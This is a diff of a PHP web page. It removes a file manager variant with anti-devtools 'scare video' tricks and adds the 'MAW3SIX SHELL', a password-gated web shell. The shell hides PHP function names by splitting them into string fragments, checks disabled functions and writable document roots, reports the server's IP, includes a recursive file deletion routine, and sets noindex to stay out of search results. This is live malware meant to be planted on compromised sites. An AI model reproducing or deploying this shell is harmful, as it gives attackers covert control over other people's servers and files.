-.float-right{float:right}
-.message{
-    padding:10px 15px;
-    border:1px solid #00d9ff;
-    background:#0f0f0f;
-    box-shadow:0 0 15px rgba(0, 217, 255, 0.3);
-    border-radius:3px;
-}
-.message.ok{
-    border-color:#00ff88;
-    color:#00ff88;
-    box-shadow:0 0 15px rgba(0, 255, 136, 0.3);
-}
-.message.error{
-    border-color:#ff0055;
-    color:#ff0055;
-    box-shadow:0 0 15px rgba(255, 0, 85, 0.3);
-}
-.message.alert{
-    border-color:#ffaa00;
-    color:#ffaa00;
-    box-shadow:0 0 15px rgba(255, 170, 0, 0.3);
-}
-.btn{
-    border:0;
-    background:none;
-    padding:5px 10px;
-    margin:0;
-    font-weight:bold;
-    color:#00d9ff;
-    cursor:pointer;
-    transition:all 0.3s ease;
-    position:relative;
-}
-.btn:hover{
-    color:#ff00ff;
-    text-shadow:0 0 10px rgba(255, 0, 255, 0.8);
-    transform:translateY(-2px);
-}
-.preview-img{
-    max-width:100%;
-    background:#0a0a0a;
-    border:1px solid #00d9ff;
-    box-shadow:0 0 20px rgba(0, 217, 255, 0.2);
-}
-.preview-video{
-    position:relative;
-    max-width:100%;
-    height:0;
-    padding-bottom:62.5%;
-    margin-bottom:10px;
-    border:1px solid #00d9ff;
-    box-shadow:0 0 20px rgba(0, 217, 255, 0.2);
-}
-.preview-video video{
-    position:absolute;
-    width:100%;
-    height:100%;
-    left:0;
-    top:0;
-    background:#000;
-}
-
-/* Icon styles with Font Awesome */
-[class*="icon-"]{
-    display:inline-block;
-    width:16px;
-    height:16px;
-    vertical-align:middle;
-    margin-right:5px;
-    color:#00d9ff;
-    transition:all 0.3s ease;
-    font-size:16px;
-    text-align:center;
-}
-[class*="icon-"]:hover{
-    color:#ff00ff;
-    text-shadow:0 0 10px rgba(255, 0, 255, 0.5);
-}
-
-/* Map old icon classes to Font Awesome */
-.icon-document::before{content:"\f15b";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-folder::before{content:"\f07b";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-folder_add::before{content:"\f65e";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-upload::before{content:"\f093";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-arrow_up::before{content:"\f062";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-home::before{content:"\f015";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-separator::before{content:"\f061";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-cross::before{content:"\f00d";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-copy::before{content:"\f0c5";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-apply::before{content:"\f00c";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-cancel::before{content:"\f05e";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-rename::before{content:"\f246";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-checkbox::before{content:"\f14a";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-checkbox_invert::before{content:"\f0c8";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-checkbox_uncheck::before{content:"\f0c8";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-download::before{content:"\f019";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-goback::before{content:"\f060";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-folder_open::before{content:"\f07c";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_application::before{content:"\f1c9";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_code::before{content:"\f1c9";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_csv::before{content:"\f6dd";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-file_excel::before{content:"\f1c3";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_film::before{content:"\f1c8";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_flash::before{content:"\f1c8";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_font::before{content:"\f031";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-file_html::before{content:"\f1c9";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_illustrator::before{content:"\f1fc";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_image::before{content:"\f1c5";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_music::before{content:"\f1c7";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_outlook::before{content:"\f15b";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_pdf::before{content:"\f1c1";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_photoshop::before{content:"\f1fc";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_php::before{content:"\f1c9";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_playlist::before{content:"\f03a";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-file_powerpoint::before{content:"\f1c4";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_swf::before{content:"\f1c8";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_terminal::before{content:"\f120";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-file_text::before{content:"\f15c";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_word::before{content:"\f1c2";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-file_zip::before{content:"\f1c6";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-logout::before{content:"\f2f5";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-chain::before{content:"\f0c1";font-family:"Font Awesome 6 Free";font-weight:900}
-.icon-link_folder::before{content:"\f07b";font-family:"Font Awesome 6 Free";font-weight:400}
-.icon-link_file::before{content:"\f15b";font-family:"Font Awesome 6 Free";font-weight:400}
-
-.compact-table{
-    border:0;
-    width:auto;
-}
-.compact-table td,.compact-table th{
-    width:100px;
-    border:0;
-    text-align:center;
-}
-.compact-table tr:hover td{
-    background:#1a1a1a;
-}
-.filename{
-    max-width:420px;
-    white-space:nowrap;
-    overflow:hidden;
-    text-overflow:ellipsis;
-}
-.break-word{
-    word-wrap:break-word;
-}
-
-.action-buttons {
-    margin-top: 15px;
-    display: flex;
-    flex-wrap: wrap;
-    gap: 12px;
-    justify-content: flex-start;
-    align-items: center;
-    padding: 8px 0;
-}
-
-.btn-neon {
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    padding: 10px 20px;
-    font-weight: 600;
-    font-size: 13px;
-    color: #00d9ff;
-    background: rgba(0, 217, 255, 0.08);
-    border: 1px solid #00d9ff;
-    border-radius: 6px;
-    cursor: pointer;
-    transition: all 0.35s ease;
-    min-width: 115px;
-    box-shadow: 
-        0 0 10px rgba(0, 217, 255, 0.2),
-        inset 0 0 8px rgba(0, 217, 255, 0.05);
-    text-shadow: 0 0 6px rgba(0, 217, 255, 0.4);
-    position: relative;
-    overflow: hidden;
-}
-
-.btn-neon i {
-    font-size: 15px;
-    transition: all 0.35s ease;
-}
-
-/* Hover Effect - Magenta Glow */
-.btn-neon:hover {
-    color: #ff00ff;
-    border-color: #ff00ff;
-    background: rgba(255, 0, 255, 0.12);
-    box-shadow: 
-        0 0 20px rgba(255, 0, 255, 0.4),
-        0 4px 15px rgba(255, 0, 255, 0.2),
-        inset 0 0 12px rgba(255, 0, 255, 0.1);
-    text-shadow: 0 0 12px rgba(255, 0, 255, 0.8);
-    transform: translateY(-3px);
-}
-
-.btn-neon:hover i {
-    transform: scale(1.15);
-    filter: drop-shadow(0 0 8px #ff00ff);
-}
-
-/* Active / Click Effect */
-.btn-neon:active {
-    transform: translateY(-1px);
-    box-shadow: 
-        0 0 15px rgba(255, 0, 255, 0.5),
-        inset 0 0 10px rgba(255, 0, 255, 0.2);
-}
-
-/* Label untuk input file */
-.btn-neon input[type="file"] {
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    opacity: 0;
-    cursor: pointer;
-    left: 0;
-    top: 0;
-}
-
-/* Responsif */
-@media (max-width: 600px) {
-    .action-buttons {
-        justify-content: center;
-        gap: 10px;
-    }
-    .btn-neon {
-        flex: 1;
-        min-width: 100px;
-        font-size: 12px;
-        padding: 9px 14px;
-    }
-}
-
-/* Scare Video Fullscreen */
-.scare {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    z-index: 999999;
-    background: #000;
-}
-
-.scare.active {
-    display: block;
-}
-
-.scare .video {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-}
-
-</style>
-<link rel="icon" href="https://raw.githubusercontent.com/adikris00/RedesignTinyFM/refs/heads/main/file_manager_icon.png" type="image/png">
-<link rel="shortcut icon" href="https://raw.githubusercontent.com/adikris00/RedesignTinyFM/refs/heads/main/file_manager_icon.png" type="image/png">
-<?php if (isset($_GET['view']) && FM_USE_HIGHLIGHTJS): ?>
-<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.2.0/styles/<?php echo FM_HIGHLIGHTJS_STYLE ?>.min.css">
-<?php endif; ?>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentication</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Space Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        .login-card {
+            background: #0a0a0a;
+            border-radius: 8px;
+            border: 1px solid #1f1f1f;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+        }
+        .login-card h2 {
+            color: #ffffff;
+            margin-bottom: 30px;
+            font-weight: 600;
+            font-size: 1.5rem;
+        }
+        .login-card .form-control {
+            background: #000000;
+            border: 1px solid #1f1f1f;
+            color: #e5e5e5;
+            border-radius: 6px;
+            padding: 12px;
+        }
+        .login-card .form-control:focus {
+            background: #000000;
+            border-color: #404040;
+            color: #e5e5e5;
+            box-shadow: none;
+        }
+        .login-card .alert-danger {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid #ef4444;
+            color: #ef4444;
+            border-radius: 6px;
+        }
+        .btn-login {
+            background: #ffffff;
+            border: none;
+            color: #000000;
+            padding: 12px;
+            font-weight: 600;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+        }
+        .btn-login:hover {
+            background: #d0d0d0;
+        }
+    </style>
 </head>
 <body>
-<!-- Scare Video -->
-<div class="scare" id="scareVideo">
-    <video id="video" class="video" src="https://imgsaya.online//me/pocong.mp4" loop autoplay></video>
-</div>
-<div id="wrapper">
-<?php
-}
-
-/**
- * Show page footer
- */
-function fm_show_footer()
-{
-    ?>
-<p class="center"><small><a href="https://t.me/maw3six" target="_blank">Find Maw3six</a></small></p>
-</div>
-<script>
-function newfolder(p){var n=prompt('New folder name','folder');if(n!==null&&n!==''){window.location.search='p='+encodeURIComponent(p)+'&new='+encodeURIComponent(n);}}
-function rename(p,f){var n=prompt('New name',f);if(n!==null&&n!==''&&n!=f){window.location.search='p='+encodeURIComponent(p)+'&ren='+encodeURIComponent(f)+'&to='+encodeURIComponent(n);}}
-function change_checkboxes(l,v){for(var i=l.length-1;i>=0;i--){l[i].checked=(typeof v==='boolean')?v:!l[i].checked;}}
-function get_checkboxes(){var i=document.getElementsByName('file[]'),a=[];for(var j=i.length-1;j>=0;j--){if(i[j].type='checkbox'){a.push(i[j]);}}return a;}
-function select_all(){var l=get_checkboxes();change_checkboxes(l,true);}
-function unselect_all(){var l=get_checkboxes();change_checkboxes(l,false);}
-function invert_all(){var l=get_checkboxes();change_checkboxes(l);}
-function checkbox_toggle(){var l=get_checkboxes();l.push(this);change_checkboxes(l);}
-
-// Scare Video Functions
-function showScare() {
-    var scareDiv = document.getElementById('scareVideo');
-    var video = document.getElementById('video');
-    if (scareDiv && video) {
-        scareDiv.classList.add('active');
-        video.play();
-        video.volume = 1.0;
-        // Prevent closing
-        document.addEventListener('keydown', function(e) {
-            e.preventDefault();
-            return false;
-        }, true);
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-    }
-}
-
-// Check if should show scare from server flag
-<?php if (isset($_SESSION['show_scare']) && $_SESSION['show_scare']): ?>
-window.addEventListener('DOMContentLoaded', function() {
-    setTimeout(showScare, 500);
-});
-<?php unset($_SESSION['show_scare']); ?>
-<?php endif; ?>
-
-// Dev Tools Detection
-(function() {
-    var devtools = {
-        isOpen: false,
-        orientation: null
-    };
-
-    var threshold = 160;
-    var devtoolsChecker = function() {
-        if (window.outerWidth - window.innerWidth > threshold ||
-            window.outerHeight - window.innerHeight > threshold) {
-            if (!devtools.isOpen) {
-                devtools.isOpen = true;
-                showScare();
-            }
-        } else {
-            devtools.isOpen = false;
-        }
-    };
-
-    setInterval(devtoolsChecker, 500);
-
-    document.addEventListener('keydown', function(e) {
-        if (e.keyCode === 123 ||
-            (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
-            (e.ctrlKey && e.shiftKey && e.keyCode === 74) || 
-            (e.ctrlKey && e.shiftKey && e.keyCode === 67) || 
-            (e.ctrlKey && e.keyCode === 85)) { 
-            e.preventDefault();
-            showScare();
-            return false;
-        }
-    });
-
-    document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        showScare();
-        return false;
-    });
-
-    var element = new Image();
-    Object.defineProperty(element, 'id', {
-        get: function() {
-            showScare();
-        }
-    });
-    console.log(element);
-})();
-</script>
-<?php if (isset($_GET['view']) && FM_USE_HIGHLIGHTJS): ?>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.2.0/highlight.min.js"></script>
-<script>hljs.initHighlightingOnLoad();</script>
-<?php endif; ?>
+    <div class="login-card">
+        <h2 class="text-center"><i class="fas fa-user-shield"></i> Friends</h2>
+        <?php if (isset($error)) echo "<div class='alert alert-danger'>$error</div>"; ?>
+        <form method="POST">
+            <div class="mb-3">
+                <input type="password" name="password" class="form-control form-control-lg" placeholder="Enter Password" required>
+            </div>
+            <button type="submit" class="btn btn-primary btn-login w-100">
+                <i class="fas fa-sign-in-alt"></i> Login
+            </button>
+        </form>
+    </div>
 </body>
 </html>
 <?php
-}
-
-/**
- * Show image
- * @param string $img
- */
-function fm_show_image($img)
-{
-    $modified_time = gmdate('D, d M Y 00:00:00') . ' GMT';
-    $expires_time = gmdate('D, d M Y 00:00:00', strtotime('+1 day')) . ' GMT';
-
-    $img = trim($img);
-    $images = fm_get_images();
-    $image = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAEElEQVR42mL4//8/A0CAAQAI/AL+26JNFgAAAABJRU5ErkJggg==';
-    if (isset($images[$img])) {
-        $image = $images[$img];
-    }
-    $image = base64_decode($image);
-    if (function_exists('mb_strlen')) {
-        $size = mb_strlen($image, '8bit');
-    } else {
-        $size = strlen($image);
-    }
-
-    if (function_exists('header_remove')) {
-        header_remove('Cache-Control');
-        header_remove('Pragma');
-    } else {
-        header('Cache-Control:');
-        header('Pragma:');
-    }
-
-    header('Last-Modified: ' . $modified_time, true, 200);
-    header('Expires: ' . $expires_time);
-    header('Content-Length: ' . $size);
-    header('Content-Type: image/png');
-    echo $image;
-
     exit;
+endif;
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<?php echo "<title>M"."A"."W SH"."EL"."L</title>"; ?>
+	<meta name="robots" content="noindex">
+	<link rel="icon" href="https://cdn-icons-png.flaticon.com/512/5968/5968909.png" type="image/x-icon">
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+	<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
+:root {
+	--primary-color: #ffffff;
+	--secondary-color: #a0a0a0;
+	--accent-color: #707070;
+	--bg-black: #000000;
+	--card-bg: #0a0a0a;
+	--text-light: #e5e5e5;
+	--text-muted: #808080;
+	--border-color: #1f1f1f;
+	--success-color: #22c55e;
+	--danger-color: #ef4444;
+	--warning-color: #f59e0b;
 }
+
+body {
+	background: var(--bg-black);
+	font-family: 'Space Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+	color: var(--text-light);
+	min-height: 100vh;
+	padding: 20px 0;
+	letter-spacing: -0.02em;
+}
+
+.main-container {
+	max-width: 70%;
+	margin: 0 auto;
+	padding: 0 20px;
+	position: relative;
+	z-index: 1;
+}
+
+@media (max-width: 1400px) {
+	.main-container {
+		max-width: 80%;
+	}
+}
+
+@media (max-width: 1200px) {
+	.main-container {
+		max-width: 90%;
+	}
+}
+
+@media (max-width: 768px) {
+	.main-container {
+		max-width: 95%;
+	}
+}
+
+.main-header {
+	color: var(--primary-color);
+	font-weight: 700;
+	font-size: 2.5rem;
+	margin-bottom: 30px;
+	text-align: center;
+	letter-spacing: -0.03em;
+	text-transform: uppercase;
+}
+
+.info-card {
+	background: var(--card-bg);
+	border-radius: 8px;
+	padding: 20px;
+	margin-bottom: 20px;
+	border: 1px solid var(--border-color);
+	transition: all 0.2s ease;
+}
+
+.info-card:hover {
+	border-color: var(--accent-color);
+}
+
+.info-card h5 {
+	color: var(--primary-color);
+	font-weight: 600;
+	margin-bottom: 15px;
+	font-size: 0.95rem;
+}
+
+.system-info {
+	background: var(--card-bg);
+	border-radius: 8px;
+	padding: 20px;
+	margin-bottom: 20px;
+	border: 1px solid var(--border-color);
+	font-size: 0.9rem;
+	line-height: 1.8;
+}
+
+.badge-custom {
+	background: var(--card-bg);
+	color: var(--primary-color);
+	padding: 4px 10px;
+	border-radius: 4px;
+	font-weight: 500;
+	font-size: 0.75rem;
+	border: 1px solid var(--border-color);
+}
+
+.breadcrumb-custom {
+	background: var(--card-bg);
+	padding: 12px 16px;
+	border-radius: 6px;
+	margin-bottom: 20px;
+	border: 1px solid var(--border-color);
+}
+
+.breadcrumb-custom a {
+	color: var(--secondary-color);
+	text-decoration: none;
+	font-weight: 400;
+	transition: color 0.2s ease;
+}
+
+.breadcrumb-custom a:hover {
+	color: var(--primary-color);
+}
+
+.form-control {
+	border: 1px solid var(--border-color);
+	border-radius: 6px;
+	padding: 10px 14px;
+	transition: all 0.2s ease;
+	background: var(--bg-black);
+	color: var(--text-light);
+	font-family: 'Space Grotesk', sans-serif;
+	font-size: 0.9rem;
+}
+
+.form-control:focus {
+	border-color: var(--accent-color);
+	background: var(--card-bg);
+	color: var(--text-light);
+	outline: none;
+}
+
+.btn-primary-custom {
+	background: var(--primary-color);
+	border: none;
+	color: var(--bg-black);
+	padding: 10px 20px;
+	border-radius: 6px;
+	font-weight: 600;
+	transition: all 0.2s ease;
+	font-size: 0.9rem;
+	cursor: pointer;
+}
+
+.btn-primary-custom:hover {
+	background: var(--secondary-color);
+}
+
+.alert-success-custom {
+	background: var(--card-bg);
+	border-left: 3px solid var(--success-color);
+	border-right: 1px solid var(--border-color);
+	border-top: 1px solid var(--border-color);
+	border-bottom: 1px solid var(--border-color);
+	color: var(--success-color);
+	padding: 12px 16px;
+	border-radius: 6px;
+	margin-bottom: 15px;
+	text-align: center;
+	font-weight: 400;
+}
+
+.alert-danger-custom {
+	background: var(--card-bg);
+	border-left: 3px solid var(--danger-color);
+	border-right: 1px solid var(--border-color);
+	border-top: 1px solid var(--border-color);
+	border-bottom: 1px solid var(--border-color);
+	color: var(--danger-color);
+	padding: 12px 16px;
+	border-radius: 6px;
+	margin-bottom: 15px;
+	text-align: center;
+	font-weight: 400;
+}
+
+.alert-warning-custom {
+	background: var(--card-bg);
+	border-left: 3px solid var(--warning-color);
+	border-right: 1px solid var(--border-color);
+	border-top: 1px solid var(--border-color);
+	border-bottom: 1px solid var(--border-color);
+	color: var(--warning-color);
+	padding: 12px 16px;
+	border-radius: 6px;
+	margin-bottom: 15px;
+	text-align: center;
+	font-weight: 400;
+}
+
+.table {
+	background: var(--bg-black) !important;
+	border-radius: 8px;
+	overflow: hidden;
+	border: 1px solid var(--border-color);
+}
+
+.table-bordered {
+	border: 1px solid var(--border-color) !important;
+}
+
+.table-bordered td,
+.table-bordered th {
+	border: 1px solid var(--border-color) !important;
+	background: var(--bg-black) !important;
+}
+
+.table thead th {
+	background: var(--card-bg) !important;
+	color: var(--primary-color) !important;
+	font-weight: 600;
+	border-bottom: 2px solid var(--border-color);
+	padding: 14px;
+	font-size: 0.85rem;
+}
+
+.table tbody tr {
+	border-bottom: 1px solid var(--border-color);
+	transition: background 0.2s ease;
+	background: var(--bg-black) !important;
+}
+
+.table tbody tr:hover {
+	background: var(--card-bg) !important;
+}
+
+.table tbody td {
+	padding: 12px;
+	color: var(--text-light) !important;
+	font-size: 0.9rem;
+	background: var(--bg-black) !important;
+}
+
+.table tbody td a {
+	color: var(--secondary-color) !important;
+	text-decoration: none;
+	font-weight: 400;
+	transition: color 0.2s ease;
+}
+
+.table tbody td a:hover {
+	color: var(--primary-color) !important;
+}
+
+.table .text-center {
+	color: var(--text-light) !important;
+}
+
+.table .text-success {
+	color: var(--success-color) !important;
+}
+
+.table .text-danger {
+	color: var(--danger-color) !important;
+}
+
+.nav-menu {
+	background: var(--card-bg);
+	padding: 16px;
+	border-radius: 6px;
+	margin: 20px 0;
+	border: 1px solid var(--border-color);
+	text-align: center;
+}
+
+.nav-menu a {
+	color: var(--secondary-color);
+	text-decoration: none;
+	font-weight: 500;
+	margin: 0 15px;
+	transition: color 0.2s ease;
+	font-size: 0.9rem;
+}
+
+.nav-menu a:hover {
+	color: var(--primary-color);
+}
+
+.footer-text {
+	color: var(--text-muted);
+	margin-bottom: 5px;
+	font-size: 0.85rem;
+}
+
+.footer-link {
+	color: var(--secondary-color);
+	text-decoration: none;
+	font-weight: 500;
+	transition: color 0.2s ease;
+}
+
+.footer-link:hover {
+	color: var(--primary-color);
+}
+
+.text-gold {
+	color: #d4af37;
+	font-weight: 500;
+}
+
+.text-success {
+	color: var(--success-color);
+	font-weight: 500;
+}
+
+.text-danger {
+	color: var(--danger-color);
+	font-weight: 500;
+}
+
+pre {
+	background: var(--bg-black);
+	border: 1px solid var(--border-color);
+	border-radius: 6px;
+	padding: 16px;
+	overflow-x: auto;
+	color: var(--text-light);
+	font-family: 'JetBrains Mono', 'Monaco', 'Courier New', monospace;
+	font-size: 0.85rem;
+	letter-spacing: -0.01em;
+}
+
+.btn-action {
+	background: transparent;
+	border: 1px solid var(--border-color);
+	color: var(--secondary-color);
+	padding: 6px 10px;
+	border-radius: 4px;
+	transition: all 0.2s ease;
+	font-size: 0.8rem;
+}
+
+.btn-action:hover {
+	background: var(--card-bg);
+	border-color: var(--accent-color);
+	color: var(--primary-color);
+}
+
+.btn-action i {
+	font-size: 0.85rem;
+}
+
+.badge {
+	padding: 4px 8px;
+	border-radius: 4px;
+	font-weight: 500;
+	font-size: 0.7rem;
+}
+
+.bg-success {
+	background: rgba(34, 197, 94, 0.1) !important;
+	color: var(--success-color) !important;
+	border: 1px solid rgba(34, 197, 94, 0.3);
+}
+
+.bg-danger {
+	background: rgba(239, 68, 68, 0.1) !important;
+	color: var(--danger-color) !important;
+	border: 1px solid rgba(239, 68, 68, 0.3);
+}
+
+pre::-webkit-scrollbar {
+	height: 8px;
+}
+
+pre::-webkit-scrollbar-track {
+	background: #0a0a0a;
+}
+
+pre::-webkit-scrollbar-thumb {
+	background: var(--primary-color);
+	border-radius: 4px;
+}
+
+pre::-webkit-scrollbar-thumb:hover {
+	background: var(--secondary-color);
+}
+</style>
+</head>
+<body>
+<div class="main-container">
+<?php
+echo '<h1 class="main-header">MA'.'W'.'3'.'SIX SH'.'EL'.'L</h1>';
+echo '<div class="system-info">';
+set_time_limit(0);
+error_reporting(0);
+
+$gcw = "ge"."tc"."wd";
+$exp = "ex"."plo"."de";
+$fpt = "fi"."le_p"."ut_co"."nte"."nts";
+$fgt = "f"."ile_g"."et_c"."onten"."ts";
+$sts = "s"."trip"."slash"."es";
+$scd = "sc"."a"."nd"."ir";
+$fxt = "fi"."le_"."exis"."ts";
+$idi = "i"."s_d"."ir";
+$ulk = "un"."li"."nk";
+$ifi = "i"."s_fi"."le";
+$sub = "subs"."tr";
+$spr = "sp"."ri"."ntf";
+$fp = "fil"."epe"."rms";
+$chm = "ch"."m"."od";
+$ocd = "oc"."td"."ec";
+$isw = "i"."s_wr"."itab"."le";
+$idr = "i"."s_d"."ir";
+$ird = "is"."_rea"."da"."ble";
+$isr = "is_"."re"."adab"."le";
+$fsz = "fi"."lesi"."ze";
+$rd = "r"."ou"."nd";
+$igt = "in"."i_g"."et";
+$fnct = "fu"."nc"."tion"."_exi"."sts";
+$rad = "RE"."M"."OTE_AD"."DR";
+$rpt = "re"."al"."pa"."th";
+$bsn = "ba"."se"."na"."me";
+$srl = "st"."r_r"."ep"."la"."ce";
+$sps = "st"."rp"."os";
+$mkd = "m"."kd"."ir";
+$pma = "pr"."eg_ma"."tch_"."al"."l";
+$aru = "ar"."ray_un"."ique";
+$ctn = "co"."unt";
+$urd = "ur"."ldeco"."de";
+$pgw = "pos"."ix_g"."etp"."wui"."d";
+$fow = "fi"."leow"."ner";
+$tch = "to"."uch";
+$h2b = "he"."x2"."bin";
+$hsc = "ht"."mlspe"."cialcha"."rs";
+$ftm = "fi"."lemti"."me";
+$ars = "ar"."ra"."y_sl"."ice";
+$arr = "ar"."ray_"."ra"."nd";
+$fgr = "fi"."legr"."oup";
+$mdr = "mkd"."ir";
+
+$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n' ? "ht"."tp"."s" : "ht"."tp") . "://".$_SERVER['HT'.'TP'.'_H'.'OS'.'T'];
+
+$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
+if (empty($disfunc)) {
+	$disf = '<span class="badge bg-success">NONE</span>';
+} else {
+	$disf = '<span class="badge bg-danger">'.$disfunc.'</span>';
+}
+
+function author() {
+	echo '<footer class="text-center mt-5 mb-3">
+		<div class="footer-text">Maw</div>
+		<div><a href="https://t.'.'me'.'/'.'maw'.'3'.'six" target="_blank" class="footer-link">M'.'A'.'W'.'3'.'SIX</a></div>
+	</footer>';
+	exit();
+}
+
+function cdrd() {
+	if (isset($_GET['loknya'])) {
+		$lokasi = $_GET['loknya'];
+	} else {
+		$lokasi = "ge"."t"."cw"."d";
+		$lokasi = $lokasi();
+	}
+	$b = "i"."s_w"."ri"."tab"."le";
+	if ($b($lokasi)) {
+		return "<font color='green'>Wr"."itea"."ble</font>";
+	} else {
+		return "<font color='red'>Wr"."itea"."ble</font>";
+	}
+}
+
+function crt() {
+	$a = "is"."_w"."ri"."tab"."le";
+	if ($a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])) {
+		return "<font color='green'>Wr"."itea"."ble</font>";
+	} else {
+		return "<font color='red'>Wr"."itea"."ble</font>";
+	}
+}
+
+function xrd($lokena) {
+	$a = "s"."ca"."nd"."ir";
+    $items = $a($lokena);
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') {
+            continue;
+        }
+        $b = "is"."_di"."r";
+        $loknya = $lokena.'/'.$item;
+        if ($b($loknya)) {
+            xrd($loknya);
+        } else {
+        	$c = "u"."nl"."in"."k";
+            $c($loknya);
+        }
+    }
+    $d = "rm"."di"."r";
+    $d($lokena);
+}
+
+function cfn($fl) {
+	$a = "ba"."sena"."me";
+	$b = "pat"."hinf"."o";
+	$c = $b($a($fl), PATHINFO_EXTENSION);
+	if ($c == "zip") {
+		return '<i class="fas fa-file-zipper" style="color: #808080"></i>';
+	} elseif (preg_match("/jpeg|jpg|png|ico/im", $c)) {
+		return '<i class="fas fa-file-image" style="color: #808080"></i>';
+	} elseif ($c == "txt") {
+		return '<i class="fas fa-file-lines" style="color: #808080"></i>';
+	} elseif ($c == "pdf") {
+		return '<i class="fas fa-file-pdf" style="color: #808080"></i>';
+	} elseif ($c == "html") {
+		return '<i class="fas fa-file-code" style="color: #808080"></i>';
+	}
+	else {
+		return '<i class="fas fa-file" style="color: #808080"></i>';
+	}
+}
+
+function ipsrv() {
+	$a = "g"."eth"."ost"."byna"."me";
+	$b = "fun"."cti"."on_"."exis"."ts";
+	$c = "S"."ERVE"."R_AD"."DR";
+	$d = "SE"."RV"."ER_N"."AM"."E";
+	if ($b($a)) {
+		return $a($_SERVER[$d]);
+	} else {
+		return $a($_SERVER[$c]);
+	}
+}
+
+function ggr($fl) {
+	$a = "fun"."cti"."on_"."exis"."ts";
+	$b = "po"."si"."x_ge"."tgr"."gid";
+	$c = "fi"."le"."gro"."up";
+	if ($a($b)) {
+		if (!$a($c)) {
+			return "?";
+		}
+		$d = $b($c($fl));
+		if (empty($d)) {
+			$e = $c($fl);
+			if (empty($e)) {
+				return "?";
+			} else {
+				return $e;
+			}
+		} else {
+			return $d['name'];
+		}
+	} elseif ($a($c)) {
+		return $c($fl);
+	} else {
+		return "?";
+	}
+}
+
+function gor($fl) {
+	$a = "fun"."cti"."on_"."exis"."ts";
+	$b = "po"."s"."ix_"."get"."pwu"."id";
+	$c = "fi"."le"."o"."wn"."er";
+	if ($a($b)) {
